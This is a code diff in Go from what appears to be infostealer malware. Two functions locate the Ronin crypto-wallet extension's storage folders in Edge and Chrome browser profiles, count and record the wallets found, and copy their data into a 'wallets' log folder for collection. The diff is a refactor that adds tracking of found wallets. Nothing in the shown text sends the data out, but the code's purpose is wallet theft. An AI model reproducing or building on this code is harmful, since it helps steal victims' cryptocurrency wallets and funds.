@@ -8,30 +8,32 @@ import (
 )
 
 func CopyRoninEdge(browserPath, logFolderPath string) {
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")); !os.IsNotExist(err) {
-		utils.WalletAmount++
-	}
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")); !os.IsNotExist(err) {
-		utils.WalletAmount++
-	}
-	//_____________________
-	//metamask edge version
-	ronine := path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")
-
-	utils.CopyFolderFiles(ronine, path.Join(logFolderPath, "wallets", "ronin_edge"))
-
-	//metamask chrome version
 	roninc := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")
 
+	ronine := path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")
+
+	if _, err := os.Stat(roninc); !os.IsNotExist(err) {
+		utils.WalletAmount++
+		utils.FoundWallets += "ronin_edge_chromeversion\n"
+	}
+	if _, err := os.Stat(ronine); !os.IsNotExist(err) {
+		utils.WalletAmount++
+		utils.FoundWallets += "ronin_edge\n"
+	}
+	//_____________________
 	utils.CopyFolderFiles(roninc, path.Join(logFolderPath, "wallets", "ronin_edge_chromeversion"))
+
+	utils.CopyFolderFiles(ronine, path.Join(logFolderPath, "wallets", "ronin_edge"))
 }
 
 func CopyRoninChrome(browserPath, logFolderPath string) {
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")); !os.IsNotExist(err) {
+	ronin := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")
+
+	if _, err := os.Stat(ronin); !os.IsNotExist(err) {
 		utils.WalletAmount++
+		utils.FoundWallets += "ronin_chrome\n"
 	}
 	//______________________
-	ronin := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")
 
 	utils.CopyFolderFiles(ronin, path.Join(logFolderPath, "wallets", "ronin_chrome"))
 }
